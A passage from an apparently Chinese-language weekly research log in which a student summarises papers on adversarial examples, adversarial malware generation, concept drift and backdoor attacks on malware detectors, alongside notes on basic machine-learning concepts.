aria-hidden="true">image-20230203192945805</figcaption></figure><ul><li>之前通过看论文零散学习的时候，对这些概念都有一定了解，但是此番系统学习，则让我理解的<strong>更加深刻</strong>，且更多地知道了<strong>推导过程。</strong></li></ul></li><li><p>下一个目标：</p><ul><li>在之前部署的jupter notebook 中使用python简单<strong>实现本周所学习的梯度下降算法</strong></li><li>并继续后续的machinglearning学习，<strong>开始学习多特征的模型</strong></li></ul></li></ul><h3 id="section-45">2023-01-19</h3><p><ahref="https://www.researchgate.net/publication/269935591_Explaining_and_Harnessing_Adversarial_Examples">Explainingand Harnessing AdversarialExamples</a>（3）；相关记录：2023-01-13，2023-01-06</p><ul><li><p>存留的问题</p><ul><li>如何理解模型平均化不足和正则化不足</li><li>如何理解正则化收益</li></ul></li><li><p>一些知识点&amp;结论</p><p><ahref="https://www.cnblogs.com/horacle/p/13171057.html">梯度</a></p><ul><li>深度学习模型可以学习一些函数来抵抗对抗性攻击，而浅层模型则没有这种功能。<ul><li>针对在训练集上对抗样本没有达到0错误率，作者提出了两种方法去改进实验去下降对对抗样本分类的错误率。</li></ul></li><li>针对对抗训练这一点。作者的实验结果表明<ul><li>用原来的模型生成的对抗样本作用在原来的模型上，错误率是89.4%，但是作用在使用对抗样本训练的模型上，错误率是17.9%。用对抗样本训练的模型去生成对抗样本，作用在原来的模型上，错误率是40.9%，作用在用对抗样本训练的模型上，错误率是19.6</li></ul></li><li>梯度：对各个自变量求偏导，得到的结果写成向量形式即为梯度。<ul><li>所有下降方向中，梯度下降最多</li><li>使用梯度寻找最优参数</li></ul></li><li>文中提出的：针对FGSM——快速生成对抗样本的方法，作者认为：生成对抗样本更应该关注的是扰动的方向而不是扰动的数目</li><li>实验证明使用FGSM算法确实可以加快对抗样本的生成</li></ul><figure><img src="https://s2.loli.net/2023/01/19/2IUpWdmPcQwC7zS.png"alt="image-20230119194933202" /><figcaption aria-hidden="true">image-20230119194933202</figcaption></figure><ul><li><strong>损失函数</strong>用来评价模型的<strong>预测值</strong>和<strong>真实值</strong>不一样的程度，损失函数越好，通常模型的性能越好。不同的模型用的损失函数一般也不一样。</li><li><strong>5 ADVERSARIAL TRAINING OF LINEAR MODELS VERSUSWEIGHT</strong> 这一节有点难读懂：涉及正则化知识</li><li>实验论证了RBF网络对对抗样本的抵抗性:实验过程还是使用快速梯度下降方法生成对抗样本，RBF网络是很难被对抗样本愚弄的</li><li>最后一个实验针对对抗样本能在不同架构的训练模型之间泛化，依旧是基于作者开头提到的线性观点下进行实验。<ul><li>实验结果发现，线性模型产生的对抗样本在其他线性模型中的预测成功率大于非线性模型产生的对抗样本。</li><li>因此，线性因素在对抗样本的泛化中占主要因素</li></ul></li></ul><h4 id="总结-31">总结</h4><ul><li>本周，在学习深度学习知识的基础上，分析了实验与相应实验结论的对应。<ul><li>论证过程是与结论一一对应的，但是当出现一些问题时，作者采用的改进方法的原因不清楚。</li><li>之前一直尝试在阅读论文中学习积累知识，但是这样学习太零碎了，没法成体系。至今为止，专业知识、数学知识还是摆在面前最大的问题。</li><li>接下来的学习还是集中以上两块，论文阅读进度会减慢。</li><li><ahref="https://blog.csdn.net/WangHY_XCJ/article/details/109401368">论文笔记</a>，看了一篇这种论文笔记，我能达到这种水平就是很大进步了。</li></ul></li></ul></li></ul><h3 id="section-46">2023-01-13</h3><h4 id="论文学习-2">论文学习</h4><p><ahref="https://www.researchgate.net/publication/269935591_Explaining_and_Harnessing_Adversarial_Examples">Explainingand Harnessing Adversarial Examples</a>（2）；相关记录：2023-01-06</p><ul><li><h6 id="概念知识积累"><strong>概念知识积累</strong></h6><ul><li><p>MNIST 数据集：</p><ul><li><p>是一个手写体数字的图片数据集，该数据集来由美国国家标准与技术研究所（NationalInstitute of Standards and Technology(NIST)）发起整理，一共统计了来自250个不同的人手写数字图片，其中50%是高中生，50%来自人口普查局的工作人员。该数据集的收集目的是希望通过算法，实现对手写数字的识别。</p></li><li><h6 id="mnist数据集简介"><ahref="https://blog.csdn.net/tony_vip/article/details/118735261">Mnist数据集简介</a></h6></li><li><p>maxout 激活函数</p><ul><li><ahref="https://zhuanlan.zhihu.com/p/176988745">Maxout激活函数以及特点？</a></li><li>在深度学习网络中加入一层激活函数层,包含一个参数k.这一层相比ReLU,sigmoid等,其特殊之处在于增加了k个神经元,然后输出激活值最大的值。</li><li><strong>优点</strong>：Maxout的拟合能力非常强，可以拟合任意的凸函数。Maxout具有ReLU的所有优点，线性、不饱和性。同时没有ReLU的一些缺点。如：神经元的死亡。</li><li><strong>缺点</strong>：从上面的激活函数公式中可以看出，每个神经元中有两组(w,b)参数，那么参数量就增加了一倍，这就导致了整体参数的数量激增。</li></ul></li><li><p>训练集分类误差1%，验证集分类误差11%：高方差问题，即存在过拟合；</p><ul><li>训练集分类误差15%，验证集分类误差16%：高偏差问题，即存在欠拟合；</li><li>训练集分类误差15%，验证集分类误差30%：高方差、高偏差问题；</li><li>训练集分类误差0.5%，验证集分类误差1%：低方差、低偏差问题；</li></ul></li></ul></li><li><p>DROPOUT</p><p><ahref="https://zhuanlan.zhihu.com/p/38200980">深度学习中Dropout原理解析</a></p><ul><li><p>在机器学习的模型中，如果模型的参数太多，而训练样本又太少，训练出来的模型很容易产生过拟合的现象</p><ul><li>如果模型过拟合，那么得到的模型几乎不能用。为了解决过拟合问题，一般会采用模型集成的方法，即训练多个模型进行组合。但是费时。</li><li>Dropout（解决过拟合）说的简单一点就是：我们在前向传播的时候，让某个神经元的激活值以一定的概率p停止工作，这样可以使模型泛化性更强，因为它不会太依赖某些局部的特征。</li></ul><figure><img src="https://s2.loli.net/2023/01/13/73N2V1Im46GipSa.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><ul><li></li></ul></li></ul></li><li><p>优化问题： <a href="https://hujichn.github.io/">[Ji Hu'sBlog]</a></p><ul><li>约化(Reducibility)：一个问题A可以约化为问题B的含义是，可以用问题B的解法解决问题A。</li><li>e.g.:例如求解一元一次方程这个问题可以约化为求解一元二次方程，即可以令对应项系数不变，二次项的系数为0，将A的问题的输入参数带入到B问题的求解程序去求解。</li><li>约化还具有传递性，A可以化约为B，B可以约化为C，那么A也可以约化为C</li><li><strong>P Problem</strong>:对于任意的输入规模n，问题都可以在n的多项式时间内得到解决(这个知识第二次接触了，在有例子的情况下很容易理解)<ul><li><strong>NP(Non-deterministic Polynomial) Problem</strong>:可以在多项式的时间里验证一个解的问题:比如n个数中间找到最大值，或者n个数排序之类的。</li><li><strong>NPC(Non-deterministic Polynomial Complete) Problem</strong>:满足两个条件 (1)是一个NP问题(2)所有的NP问题都可以约化到它:例如求问图中起点到终点是否有一条小于100个单位长度的路线，随便选一条，如果算出来路径小于100，那么就猜到了一个解，也就是说如果你运气足够好的话就可以在多项式时间内解决这个问题。当然猜的前提是问题存在解。</li><li><strong>NP-Hard Problem</strong>:满足NPC问题的第二条，但不一定要满足第一条</li></ul></li></ul></li><li><p>softmax回归是logistic回归的一般形式，logistic 回归用于二分类，而softmax 回归用于多分类</p></li><li><p>L-BFGS: 优化算法</p></li><li><p>RBF网络：与生俱来能抵抗对抗样本</p></li></ul></li><li><p>论文观点</p><ul><li>作者基于对抗样本对模型的影响是由于模型线性，发现了一种对抗样本更为快速的生成方式</li></ul></li></ul><h4 id="总结-32">总结</h4><ul><li>本周继续阅读上周的论文，主要的任务仍然是对文中所涉及的概念、算法进行学习。这些已经积累的差不多了。</li><li>下周目标：要想清楚知道作者是如何论证他所提出的观点的、以及作者为何要做那些实验操作。还必须学习相关的概率统计知识。<ul><li>因此下周就以此为目标：思考作者<ul><li>如何提出这些观点，并基于这些假设，如何一步步得出他的研究成果。</li></ul></li></ul></li><li>这篇论文的价值意义之一：突破机器学习的相关障碍，以便在以后论文阅读中能够把更多精力花在作者思路上。</li></ul><h3 id="section-47">2023-01-06</h3><ul><li>置信度<ul><li><strong>e.g</strong>.,如果在一次大选中某人的支持率为55%，而<strong>置信水平0.95上的置信区间</strong>是（50%,60%），那么他的<strong>真实支持率</strong>有百分之九十五的机率落在百分之五十和百分之六十之间，因此他的真实支持率不足一半的可能性小于百分之2.5（假设分布是对称的）。</li></ul></li></ul><h4 id="论文学习-3">论文学习</h4><p><ahref="https://www.researchgate.net/publication/269935591_Explaining_and_Harnessing_Adversarial_Examples">Explainingand Harnessing Adversarial Examples</a>（ICLR2015）：上期论文引用的文章</p><ul><li><p>摘要</p><ul><li>前人认为模型受到对抗样本的影响是由非线性和过拟合造成的</li><li>作者认为：是跟<strong>线性</strong>关系很大。并且基于此，提出了一种更快生成对抗样本的方法。<ul><li>高维空间中的线性行为就能够引起对抗样本</li></ul></li></ul></li><li><p>结论：</p><ul><li><p>对抗样本能够在不同模型<strong>泛化</strong>，是因为对抗样本的扰动与模型的权重向量高度对齐的结果。（暂时不理解</p></li><li><p><code>The direction of perturbation, rather than the speciﬁc point in space, matters most. Space is not full of pockets of adversarial examples that ﬁnely tile the reals like the rational numbers</code>（如何理解</p></li><li><p>对抗性训练可以导致<strong>正则化</strong></p></li><li><p><strong>易于优化</strong>的模型容易受到干扰</p></li><li><p><strong>线性模型</strong>缺乏抵抗对抗扰动的能力</p></li><li><p><strong>RBF网络</strong>对对抗样本有抗干扰能力</p></li></ul></li><li><p><strong>知识积累</strong></p><ul><li><code>Early attempts at explaining this phenomenon focused on nonlinearity and overfitting.</code></li><li>正则化：防止算法过度拟合</li><li>线性：易于训练模型</li><li>非线性：抵抗对抗样本</li><li>对抗样本与原始样本非常接近：人眼无法感知区分</li><li><strong>关键词</strong>：线性</li><li>单个输入特征的精度是有限的：</li><li>权重：每种机器学习算法都基于一个假设：数据分布的变化都是有规律的。机器学习模型要做的就是要<strong>逼近这种规律</strong>。而调整权重实现的就是逼近的效果。</li><li>逻辑回归：解决二分类问题。基于线性回归，<code>sigmod函数</code></li><li><code>softmax 函数</code>：对分类结果赋予概率，而不是非黑即白</li><li>欠拟合：模型在训练集上就误差过大</li><li>过拟合：模型在训练集上表现良好，但是在测试集上与在训练上差距过大。</li><li>RBF网络：RBF作为激活函数的神经网络</li></ul></li></ul><h4 id="总结-33">总结</h4><ul><li>这篇论文是上周学习论文的一篇背景论文，与之前论文一样都探讨了改进生成对抗样本的方法，但是这篇论文与之前的论文有很大<strong>不同</strong>。<ul><li>本文深入神经网络模型结构，挖掘的是什么因素导致对抗样本对模型产生影响的。</li><li>对抗样本在不同模型能够泛化的原因</li><li>挖掘的是更加本质的问题</li><li>而<strong>之前阅读</strong>的论文重点：<ul><li>在不同分类领域，生成对抗样本的方法。</li><li>如何抵抗对抗样本</li></ul></li><li><strong>基于上述原因</strong><ul><li>文中有非常多机器学习、概率统计和矩阵论的术语。阅读起来很困难，已经很久没有阅读一篇论文这么吃力了。</li><li>因此本周在尝试精读本文到一半时已经读不下去了。转而先去学习阅读过程中提到的所有专业术语、算法、技术。所以对作者如何得出结论的并不了解。</li></ul></li></ul></li><li>下一个目标：<ul><li>继续阅读本文，感觉熟悉这篇论文之后收获会很大。</li></ul></li></ul><h3 id="section-48">2022-12-30</h3><p><strong>相关记录</strong> ：2022-12-09、2022-10-28</p><p><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572#bib0028">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a>（3）</p><h4 id="如何看懂一篇学术论文">如何看懂一篇学术论文</h4><ul><li><p><strong>为什么</strong>要进行这项研究，这项研究在解决什么问题</p></li><li><p>在解决这个问题<strong>之前</strong>，这一领域做过什么努力？之前的工作有什么<strong>局限</strong>？在作者看来，<strong>下一步</strong>需要做什么？</p></li><li><p>在研究中作者想回答什么问题</p></li><li><p>解决手段：作者要<strong>怎么做</strong></p></li><li><p>为每个实验画出一个图表，画出作者到底做了什么。里面包含你全面<strong>理解研究工作</strong>所需要的所有细节</p></li><li><p>写下一段或几段话，<strong>总结</strong>每个实验、每幅图解和每张表格的结果</p></li><li><p>你认为这些结果<strong>说明了什么问题</strong>？</p></li><li><p>作者认为结果意味着什么？你<strong>同意作者的看法吗</strong>？你能不能想出<strong>其他的方式</strong>解读结果？作者有没有意识到他们的研究存在任何<strong>弱点</strong>？你有没有发现任何作者<strong>遗漏的问题</strong>？他们建议<strong>下一步</strong>怎么做？你同意吗？</p></li></ul><blockquote><p><strong>尝试以上述方式去阅读论文</strong></p></blockquote><h4 id="论文学习-4">论文学习</h4><p><ahref="https://zhuanlan.zhihu.com/p/585456510">对抗鲁棒性学习资料汇总</a></p><ul><li><p><strong>摘要</strong>：</p><ul><li><p>针对 windows pe 文件，对抗样本的生成不能破坏它的结构和功能</p><ul><li><p>松弛空间内插入扰动</p></li><li><p>对抗样本问题在图像分类领域有很多的研究，但是跟本文针对的PE文件，有多不同，这些差异会造成对抗样本的<strong>效率和对模型的愚弄率</strong></p><ul><li><p>因此针对两者差异，本文<strong>解决了这些问题</strong>去生成质量高的对抗样本</p></li><li><p>方式：将原型样本（具有代表性的正常样本）中的字节添加到恶意软件中去产生对抗样本</p></li></ul></li></ul></li></ul></li><li><p><strong>前置知识</strong>：</p><ul><li>cyberattacks</li><li>深度学习检测模型避免了特征工程的加入</li><li>windows 平台的恶意软件占比大</li><li>windows pe 并不需要考虑增加扰动的程度</li><li>本文基于<strong>白盒模型</strong>（知道模型需要的参数和模型的结构）</li></ul></li><li><p><strong>背景</strong></p><ul><li><p>生成对抗样本的两种方式</p><ul><li>将二进制文件转化为图像</li><li>将二进制文件的字节作为向量嵌入样本</li></ul></li><li><p><strong>问题：</strong> 对windows pe文件的操控是非常困难的</p></li><li><p>可以通过对原型样本的分析，去修改输入样本以达到我们期待的输出结果</p></li><li><p><code>since the target of the attack is a binary model classifying the input files as benign or malicious, we assume that the output layer of the model is a sigmoid unit, which is equivalent to a Softmax unit with two outputs.</code></p></li><li><p><code>But in our method, as an intermediate sample, the prototype does not need to be subject to any restrictions, but only to maximize the output of the activation of the model’s output layer</code></p></li><li><p>生成对抗样本的优化问题：可以使用梯度算法解决</p><ul><li>数学知识众多：<ahref="https://www.zhihu.com/question/264189719">如何理解梯度下降</a></li></ul></li></ul></li><li><p><strong>实验</strong>：</p><ul><li>数据集：<ul><li>一部分用于训练模型</li><li>另一部分用于产生对抗样本</li></ul></li><li>模型<ul><li>基于 MalConv</li><li>改进：<ul><li>将训练样本的大小缩写，改进训练效率</li></ul></li></ul></li><li>结果：与前人的工作相比<ul><li>愚弄率最高</li><li>生成对抗样本的时间比两种更少；相比之下生成时间更多的情况下，愚弄率却更高</li><li>虽然本文提出的模型是针对与白盒模型，但是实验证明在一定程度上对黑盒模型同样有效。</li><li>参考原型去产生对抗样本可以保留文件更多有效的信息</li><li>迭代机制提高效率</li></ul></li><li>作者的下一步工作<ul><li>继续探索细粒度的修改策略产生对抗样本</li><li>探索本文提出的方法对其他检测模型的影响</li><li>探索基于白盒的模型对于黑盒模型的影响（转移性）</li></ul></li></ul></li></ul><h4 id="web-恶意代码学习记录">web 恶意代码学习记录</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/12/17/web-wen-jian-shang-chuan-lou-dong-yuan-li/">文件上传漏洞原理</a></li><li><ahref="https://liuhaihuaaacc.gitee.io/2022/12/20/web-upload-labs/">文件上传漏洞实验</a></li></ul><h4 id="总结-34">总结</h4><ul><li><strong>收获</strong><ul><li>这篇文章读过多次，这次是最深入学习的一次。带着上述提到的文献阅读策略有一定效果。会感觉到理解的<strong>更加透彻</strong>。</li><li>对于科研，首先要对<strong>前人的相关研究</strong>有足够学习，基于前人的研究去改进方法、去解决前人留下的问题和不足。同时利用前人的研究成果也会使自己的研究成果更具有说服性。</li><li>现在对于对抗样本的<strong>知识积累</strong>是不少的，阅读相关的文献、文章，都更加轻松</li></ul></li><li><strong>问题</strong><ul><li>我不知道我具体该去研究哪些点，所以以<strong>通篇精读</strong>的策略去学习文献。</li><li>不理解文中的<strong>事后可解释性</strong></li><li>对于前人的工作研究学习不够（需要更多的像现在这样全篇细读）</li><li>积累的<strong>算法</strong>不够、算法对于解决和优化问题至关重要</li><li>如果让我<strong>复现这个实验</strong>，我感觉很困难，这个实验过程我理解的不到位。</li></ul></li><li><strong>下一个目标</strong><ul><li>阅读以下论文<ul><li><a href="https://arxiv.org/abs/1412.6572">Explaining and HarnessingAdversarial Examples</a></li><li><a href="https://arxiv.org/abs/1606.04435">Adversarial PerturbationsAgainst Deep Neural Networks for Malware Classification</a></li><li><a href="https://arxiv.org/abs/1702.05983">Generating AdversarialMalware Examples for Black-Box Attacks Based on GAN</a></li><li><a href="https://dl.acm.org/doi/10.1145/3134600.3134642">MalwareDetection in Adversarial Settings: Exploiting Feature Evolutions andConfusions in Android Apps</a></li></ul></li></ul></li></ul><h3 id="section-49">2022-12-09</h3><h4 id="论文再学习">论文再学习</h4><p>​ <ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572#bib0028">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a>（2）</p><ul><li><p>对抗样本问题是一种<strong>约束优化问题</strong></p></li><li><p>生成对抗样本的<strong>方式</strong>（本文重要的一部分）：在二进制文件的特定位置嵌入一些字节</p><ul><li>在节与节之间</li><li>文件末尾的字节</li><li>新增加部分的字节</li></ul></li><li><p>机器学习中的<strong>可解释性问题</strong>（在多篇文献中看到，这也是AI中讨论研究的一个热点）</p><ul><li>我们无法掌握模型作出预测的依据，也不知道它什么时候会出现错误。因此解决模型的可解释性问题很关键。</li><li>对于特定的数据和某种特定的任务，特定经验的人群拥有对于特定模型最大程度上的理解</li></ul><hr /><ul><li>训练前:数据分析吗，尽可能地了解数据</li><li>训练过程中：打造一个可解释的模型。<strong>决策树</strong>是可解释的。<ul><li>决策树：一种分类方法<ul><li>基于节点的属性值去分类</li></ul></li></ul></li><li>训练后的可解释性<ul><li>敏感性分析：删除某个数据，看对模型的影响程度</li><li>基于梯度的方法：看输入的哪一部分属性值对模型影响最大</li></ul></li><li>可解释性问题解决的是人类对模型的信任问题</li></ul><hr /></li><li><p><strong>激活最大化（AM）:</strong>在神经网络中，每个神经元会提取特定的特征，这样就能使特定的神经元得到输入偏好。我们需要为这些神经元找到这些特定的输入。而AM可以将这一过程可视化。</p></li><li><p>梯度下降算法：函数极值问题</p><ul><li>追求目标函数的导数寻求函数最小化</li><li>寻找使得目标函数最小化时自变量的值</li></ul></li><li><p>关于<strong>实验过程</strong></p><ul><li>实验数据的获得，实验数据的代表性</li><li>在多种情况下进行实验，并与前人的实验研究进行对比，以谋求改进</li></ul></li></ul><h4 id="总结-35">总结</h4><ul><li><strong>收获</strong>：<ul><li>学习了如何对windows PE文件生成对抗样本</li><li>衡量生成对抗样本的评估标准：恶意软件在检测模型中的逃避率</li><li>AI模型中的可解释性问题及其他AI知识</li><li>我们需要学习积累多种算法，改进并应用到自己的科研实验中</li></ul></li><li>下一个<strong>目标</strong><ul><li>目前感觉收获还是不多。，需要继续对文献的细节深入，这一过程应该需要积累。</li></ul></li></ul><h3 id="section-50">2022-12-02</h3><h4 id="博文相关学习">博文相关学习</h4><ul><li><strong>网络安全博文</strong><ul><li><ahref="https://cloud.tencent.com/developer/column/83592">绿盟科技研究通讯</a></li></ul></li><li>概念漂移：<ul><li>随着时间推移，测试数据和训练数据不一致，导致测试数据分类错误（例如，恶意代码检测中，恶意代码出现变种的现象，此时模型不能再适用</li></ul></li><li>对抗样本：<ul><li>通过对输入样本增加微小的扰动，使得学习模型输出错误的结果。</li></ul></li><li>针对上述两个概念：<ul><li>区别是否有人工干扰</li></ul></li></ul><h4 id="系统学习machine-learning">系统学习machine learning</h4><ul><li><ahref="https://liuhaihuaaacc.gitee.io/2022/12/03/ml03/">传送门</a>（记录学习过程</li></ul><h4 id="总结-36">总结</h4><ul><li>查了挺多资料、看了一些博文，然后自身针对论文中的许多细节，首先问题在于对于机器学习技术的掌握，因此接下来的学习都会以<strong>机器学习</strong>作为重点。</li><li>在之前的阅读论文中，对于机器学习技术的了解，都是比较零碎的，系统学习这块知识是当务之急。</li><li>以及在真正的科研实验中，训练模型等实践过程都需要这门技术。</li><li>就像在看论文时发现没有很系统的机器学习知识基础无法继续深入研究一样，同时也需要不断深入论文的细节中去<strong>发现更多的问题</strong>，然后去学习、去解决疑惑。</li><li>根据之前看论文的顺序，将会对这篇论文开始细节研究： <ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a></li></ul><h3 id="section-51">2022-11-25</h3><h4 id="论文学习-5">论文学习</h4><p><a href="https://ieeexplore.ieee.org/document/9833659">TranscendingTRANSCEND: Revisiting Malware Classification in the Presence of ConceptDrift</a>（CCF-A会议:IEEE S&amp;P）</p><ul><li><p>关键词</p><ul><li><p>malware</p></li><li><p>machine learning</p></li><li><h6id="concept-drift恶意软件会随着防御的增强而进化演变成偏离原本的训练分布一个全新的概念且本文于此展开">ConceptDrift：恶意软件会随着防御的增强而进化演变成偏离原本的训练分布（一个全新的概念，且本文于此展开）</h6></li></ul></li><li><p>首先<strong>TRANSCEND</strong>是解决检测恶意代码分类模型中的概念漂移问题中的一种系统</p></li><li><p>机器学习在分类领域、计算机视觉、自然语言处理取得良好表现的前提假设：<code>However, a great deal of this success is conditional on one central assumption: that the training and test data are drawn identically and independently from the same underlying distribution</code></p></li><li><p>现有的两种解决概念漂移的两种方法</p><ul><li><code>The first is to design systems which are intrinsically more *resilient* to drift by developing more robust feature spaces</code></li><li><code>A second solution is to *adapt* to the drift, for example by updating the model using incremental retraining or online learning [30], [50], or rejecting drifting points.</code></li></ul></li><li><p>注意这个新概念： <strong>conformal predictiontheory</strong>。</p></li><li><p>the state-of-the-art approaches for classification with<strong>rejection</strong></p></li><li><p>Dataset shift的分类</p><ul><li><em>Covariate shift</em></li><li><em>label shift</em></li></ul></li><li><p><em>conformal evaluator</em></p></li><li><p>本文通过对TRANSDENCE</p></li></ul><h3 id="section-52">2022-11-18</h3><h4 id="论文学习-6">论文学习</h4><p><a href="https://ieeexplore.ieee.org/document/9484718">DL-FHMC: DeepLearning-Based Fine-Grained Hierarchical Learning Approach for RobustMalware Classification</a>（TDSC-2022）</p><ul><li>关键词：<strong>恶意代码、深度学习、静态分析、鲁棒性、机器学习、物联网</strong></li><li>对抗样本：<strong>AEs</strong></li><li>恶意代码分类在对抗样本上的研究与<strong>图像分类</strong>在对抗样本上的研究有许多相似之处</li><li>本文所做的<strong>贡献</strong><ul><li>分析DL-SSMC 在恶意代码检测和分类情况下的鲁棒性</li><li>提出了DL-FHMC系统进行恶意代码分类</li><li>研究了DL-FHMC在对抗攻击下的鲁棒性</li></ul></li><li><strong>CFG</strong>(控制流程图)在恶意代码检测中的作用</li><li>GEA与Sub-GEA</li><li><strong>数据集</strong>的采用</li><li>对比了多种<strong>学习算法</strong>并进行了评估<ul><li>RF(随机森林)</li><li>DNN(深度神经网络)</li><li>RNN(卷积神经网络)</li></ul></li><li>DL-SSMC系统的设计与评估</li></ul><h4 id="总结-37">总结</h4><ul><li><strong>收获:</strong><ul><li>一篇好的文献研究的问题和解决的问题<strong>不止一项</strong></li><li>上周所看的文献研究的是<strong>安卓环境</strong>，这次的研究的是在<strong>物联网系统</strong>中，因此可以基于这一点展开研究。</li><li>关于CCF-A类论文的<strong>论文结构设计</strong><ul><li>首先是摘要：不用多提</li><li>然后是 <strong>introduction</strong>:总体介绍研究内容与一些研究背景(或者说<strong>relatedworks</strong>)</li><li>再是具体介绍自己的成果:<ul><li>实验设计</li><li>实验评估</li></ul></li><li>最后总结讨论不足之处</li></ul></li></ul></li><li><strong>问题：</strong><ul><li>本周没有完成两篇文献阅读的任务，主要是第一篇就感觉挺难的。</li><li>仍然无法深入文中的<strong>实验细节。</strong></li><li>对作者提出的一些<strong>创新性的概念和方法</strong>，有些难以理解</li><li>知道看论文是每周必要的且需坚持的，现在的目标就是深入挖掘对抗样本与恶意代码检测这块内容，但是感觉最近<strong>没什么进展。</strong></li></ul></li><li><strong>下一个目标：</strong><ul><li>需要找一些文献中的感兴趣的点深入研究，应该会很耗时间，不能一直停留在只能理解文章大概，需要深入细节，否则感觉没有进步。</li><li>感觉也需要适当看点中文的文献解乏。</li></ul></li></ul><h3 id="section-53">2022-11-11</h3><h4 id="论文学习-7">论文学习</h4><p><ahref="https://ieeexplore.ieee.org/search/searchresult.jsp?queryText=malware%20malicious&amp;highlight=true&amp;returnFacets=ALL&amp;returnType=SEARCH&amp;matchPubs=true&amp;refinementName=Publication%20Title&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Information%20Forensics%20and%20Security&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Dependable%20and%20Secure%20Computing">在TIFS和TDSC上的恶意代码检测相关文章检索</a></p><p><ahref="https://ieeexplore.ieee.org/search/searchresult.jsp?queryText=adversarial%20example&amp;highlight=true&amp;returnType=SEARCH&amp;matchPubs=true&amp;refinementName=Publication%20Title&amp;pageNumber=1&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Information%20Forensics%20and%20Security&amp;refinements=PublicationTitle:IEEE%20Transactions%20on%20Dependable%20and%20Secure%20Computing&amp;returnFacets=ALL">在TIFS和TDSC上的对抗样本的相关文章检索</a></p><p><a href="https://ieeexplore.ieee.org/document/9477038">BackdoorAttack on Machine Learning Based Android MalwareDetectors</a>（CCF-A:TDSC-2022，作者：斯威本科技大学博士）</p><p><strong>关键词</strong>：恶意代码、后门攻击、安卓、对抗样本、机器学习</p><ul><li><p>注意到恶意代码研究<strong>安卓平台</strong>的较多</p></li><li><p>AI安全中的<strong>数据投毒攻击</strong></p><ul><li>跟对抗样本的关系是什么</li><li>数据投毒攻击分类<ul><li>模型偏斜：污染训练数据（应该就是对抗样本</li><li>反馈武器化</li><li>本文中所谈的后门攻击<strong>：</strong><ul><li>对于不包含触发器的输入input，后门模型表现得与干净模型一样正常</li><li>一旦秘密<strong>触发器Trigger</strong>（只有攻击者知道）出现在输入中，后门模型就会被错误引导去执行攻击者的子任务</li></ul></li></ul></li></ul></li><li><p>在<strong>图像分类领域</strong>有同样的问题：但是解决的方式不能照搬照抄</p></li><li><p>本文所谈到的后门攻击指：使用<strong>对抗样本</strong>污染训练数据</p></li><li><p>本文从<strong>攻击角度</strong>讨论安卓平台的恶意代码检测问题</p></li><li><p>研究背景：先前攻击方式的三个缺陷，同时也是本文解决的问题。</p><ul><li>训练数据需要非常多的对抗样本</li><li>需要计算每个对抗样本的扰动</li><li>所有的代码都会被错误检测</li></ul></li><li><p>涉及的专业知识：</p><ul><li>APK程序结构</li><li>基于机器学习的恶意代码检测模型</li><li>后门中毒攻击</li></ul></li><li><p>四种典型的安卓恶意代码检测器</p><ul><li>Drebin</li><li>DroidCat</li><li>MaMaDroid</li><li>DroidAPIMiner</li></ul></li><li><p><code>Machine learning models are prone to carefully crafted adversarial samples</code>(文章原话)</p></li><li><p>最后也验证了噪声对模型是没有影响的</p></li><li><p><strong>label reversing method.</strong></p><ul><li>标签即为分类的结果</li><li>特征为进行标签的依据</li></ul></li><li><p>防御方式</p><ul><li>Adversarial Training:</li><li>Ensemble Learning</li></ul></li><li><p>如果该方法对良性样本不影响，而只影响恶意样本的分类，那么会使得攻击的隐蔽性更好</p></li></ul><hr /><p><a href="https://ieeexplore.ieee.org/document/9762803">MsDroid:Identifying Malicious Snippets for Android MalwareDetection</a>（TDSC-2022，作者来自浙大）</p><ul><li>问题提出：<code>it is challenging to (1) stay robust towards real-world scenarios and (2) provide interpretable explanations for experts to analyse.</code><ul><li>注意到又提出了关于<strong>可解释性</strong>的问题</li></ul></li><li>本文的研究是首次将<strong>GNN模型</strong>应用于安卓恶意代码的静态分析上的研究，提出了一种名为MSDroid的恶意代码检测系统</li><li>使用了图作为代表安卓代码片段的数据机构</li><li>系统的框架:python 实现<ul><li>Pre-processing</li><li>BSS-generation</li><li>GNN-based detection</li><li>Malware Explanation</li></ul></li><li>研究了恶意代码家族分类问题</li><li>利用app中的<strong>语义信息</strong>来提取特征</li><li><strong>图形表示学习技术</strong>的利用</li><li><strong>最后：</strong>本文所研究的是一个检测系统，提出了使用代码片段去取代整个代码来识别恶意软件、使用图表示学习技术。技术含量十足，吃力读完整篇后仍然有非常多的疑问，同时也学习到了更多先进前沿技术方法。</li></ul><h4 id="总结-38">总结</h4><ul><li><strong>收获：</strong><ul><li>在这些顶刊上的文献从开头对研究问题的引出到实验设置、实验评估和结果探讨都是感觉如此的严谨和细致。（虽然不能完全看懂，但是能够感受到如此，相比于其他一些文献）</li><li>基于现阶段所阅读文献来看,安卓、对抗样本、后门攻击在基于机器学习的恶意代码检测模型中是热点</li></ul></li><li><strong>问题：</strong><ul><li>基于收获的第一点：由于对于写出一篇好的文章需要如此高的综合能力，因此现阶段很多细节不懂。不能完全领略到文章的美妙。</li><li>难以在英文文献中直接<strong>检索</strong>出恶意代码中关于对抗样本的文章</li></ul></li><li><strong>下一个目标：</strong><ul><li>针对第二篇文章中的问题，这篇文章还要细细琢磨</li><li>很明显的是顶刊的文献读起来比普通期刊的文章更加吃力、但是也更加耐人寻味。</li><li>针对以上问题：或许我觉得我需要更系统地学习研究方法、研究思路、实验方法。</li></ul></li></ul><h3 id="section-54">2022-11-04</h3><h4 